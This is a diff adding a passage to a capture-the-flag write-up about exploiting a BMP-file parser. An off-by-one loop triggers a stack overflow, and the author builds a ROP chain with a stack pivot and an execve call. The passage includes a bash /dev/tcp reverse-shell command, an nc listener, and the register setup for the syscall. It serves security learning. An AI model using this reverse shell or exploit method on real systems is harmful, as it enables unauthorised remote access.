@@ -78,4 +78,87 @@ In this case, the author changed the following block of codes:
 ...
 ```
 
-<p>
+The flow of the program is: 
+```
+read meta data of BMP file 
+--> get height and width --> copy data of that file into heap 
+--> ...
+```
+- Because the loop execute one more time than usual, it works as following:
+```
+loop number > height
+--> triggers EOF 
+--> call __cxa_throw 
+--> somehow go to BmpFile::getdata 
+--> copy data from heap to stack 
+--> call getheaders 
+--> memcpy again to the stack 
+--> triggers bof
+```
+
+</p>
+
+## Exploit the program
+Now we just need to ROP-chain to call shell after getting bof
+
+- Security check of vulnerable program:
+
+```
+Arch:     amd64
+RELRO:      Partial RELRO
+Stack:      No canary found
+NX:         NX enabled
+PIE:        No PIE (0x3fe000)
+RUNPATH:    b'.'
+Stripped:   No
+```
+
+* Here is my method to get shell by ROP-chain:
+1. Memcpy all of data again to bss 
+2. Stack pivot to that area
+3. Call execve with reverse shell
+
+### Reverse shell
+As usual, We use execve(/bin/sh, 0, 0) to get normal shell. But in this challenge, it is a bit different. The challenge acts as a virtual web. It only receive our upload file then <b> read </b> it in <b> sub-process </b>
+
+In other words, we just upload our virus file on the server and <b> leave instantly </b>. The server reads it alone without interact with us (only gives the result). So if I use the normal method, I'll fail to win
+
+The best method is using reverse shell:
+- Make the server's sub-process connects and gives shell in my local host server by its choice (controlled by us)
+
+Note that I need to create local host first:
+```
+nc -lvnp 9001
+```
+
+Here is how to call reverse shell using execve:
+
+- RDI: Pointer to b'/bin/bash'
+
+- RSI: Pointer to an array of string pointers:
+   <b>
+    1. Pointer to b'/bin/bash'
+    2. Pointer to b'-c'
+    3. Pointer to b"bash -i >& /dev/tcp/YOUR_IP/LOCAL_OPENING_PORT 0>&1"
+    4. Pointer to NULL
+    </b>
+
+- RDX: NULL
+
+- RAX: 0x3b
+ 
+Then <b> SYSCALL </b>
+
+I can get my IP by using:
+```
+ip addr
+```
+or
+```
+ip a
+```
+Because my target is my own docker so I can just find <b>docker0 </b> section and get my local IP from line:
+```
+inet 172.17.0.1/16 brd ...
+```
+If your target is the event's server, do the same with <b> wlp2s0 </b> section, that is your real internet IP
